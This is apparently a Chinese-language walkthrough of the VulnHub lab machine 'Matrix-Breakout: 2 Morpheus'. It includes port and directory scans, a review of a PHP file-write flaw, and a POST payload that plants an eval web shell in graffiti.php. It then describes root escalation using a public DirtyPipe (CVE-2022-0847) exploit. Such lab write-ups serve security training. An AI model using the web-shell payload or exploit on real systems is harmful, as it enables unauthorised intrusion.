---
sidebar_position: 5
tags: [Easy, Linux, LFI, 代码执行, CVE]
title: "MATRIX-BREAKOUT: 2 MORPHEUS"
sidebar_label: "MATRIX-BREAKOUT: 2 MORPHEUS"
---
# MATRIX-BREAKOUT: 2 MORPHEUS
## 端口扫描
```bash
jtz@attacker:~$ nmap -sTCV -p- --min-rate 1000 192.168.1.8
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-16 15:39 CST
Nmap scan report for morpheus (192.168.1.8)
Host is up (0.019s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|_  256 aa83c351786170e5b7469f07c4ba31e4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Morpheus:1
|_http-server-header: Apache/2.4.51 (Debian)
81/tcp open  http    nginx 1.18.0
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Meeting Place
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## 80
```bash
jtz@attacker:~/CTF/VulhHub/MARRIX$ gobuster dir -u http://192.168.1.8/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,php===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.8/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
2023/12/16 16:29:54 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 348]
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/javascript           (Status: 301) [Size: 315] [--> http://192.168.1.8/javascript/]
/robots.txt           (Status: 200) [Size: 47]
/graffiti.php         (Status: 200) [Size: 459]
/graffiti.txt         (Status: 200) [Size: 142]
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
Progress: 881686 / 882244 (99.94%)
===============================================================
2023/12/16 16:35:47 Finished
===============================================================
```
之后访问其中的 `graffiti.php` 请求, 发现其参数比较特殊, 根据其内容我们知道目标是针对 `graffiti.txt` 文件, 我们可以借此尝试文件包含漏洞的利用

![20240524135026](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135026.png)

经过了一系列的尝试, 我发现并不知道直接去阅读文件, 这个看起来是读取我们传入的内容并将其存储到 graffiti.txt 文件中, 之后读取 graffiti.txt 文件内容显示出来, 可以借此来尝试 PHP 伪协议进行攻击

![20240524135042](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135042.png)
```php

<?php
$file="graffiti.txt";
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['file'])) {
       $file=$_POST['file'];
    }
    if (isset($_POST['message'])) {
        $handle = fopen($file, 'a+') or die('Cannot open file: ' . $file);
        fwrite($handle, $_POST['message']);
	fwrite($handle, "\n");
        fclose($file); 
    }
}

// Display file
$handle = fopen($file,"r");
while (!feof($handle)) {
  echo fgets($handle);
  echo "<br>\n";
}
fclose($handle);
?>
<p>
Enter message: 
<p>
<form method="post">
<label>Message</label><div><input type="text" name="message"></div>
<input type="hidden" name="file" value="graffiti.txt">
<div><button type="submit">Post</button></div>
</form>
```
之后将其解密我们可以看到对应的加密内容, 之后我们审查源代码, 我发现这是一个先指定文件追加内容的功能,或者读取指定文件的内容, 借此我们可以尝试向 `graffiti.php` 文件中追加一段内容进行代码执行
```php
message=<%3fphp+%40eval($_POST['cmd'])%3b+%3f>&file=graffiti.php
```
![20240524135119](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135119.png)
## 后渗透
### www-data
之后我们就可以借此来获取一个 Shell
![20240524135143](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135143.png)
### www-data --> root
之后上传 Linpeas.sh 脚本进行执行我们可以发现存在一个 CVE 漏洞
![20240524135203](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135203.png)
之后在 Github 搜索到 [CVE-2022-0847](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)进行利用最终获取到了对应的 root 权限
![20240524135250](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135250.png)
## 扩展
### docker
```bash
www-data@morpheus:/tmp$ df
df
Filesystem     1K-blocks    Used Available Use% Mounted on
/dev/sda1        5042396 1958536   2843356  41% /
udev              225352       0    225352   0% /dev
tmpfs             241956       0    241956   0% /dev/shm
tmpfs              48392     572     47820   2% /run
tmpfs               5120       0      5120   0% /run/lock
/dev/sda15        126678    6016    120662   5% /boot/efi
overlay          5042396 1958536   2843356  41% /var/lib/docker/overlay2/d13e48a56e3ab95baad2c1aef075980aecbd25b19ae91ef7edac46c7a944c08d/merged
tmpfs              48388       0     48388   0% /run/user/0
```
执行 `df` 命令后, 我们可以看到其中有一个 docker 的目录, 可惜没有什么用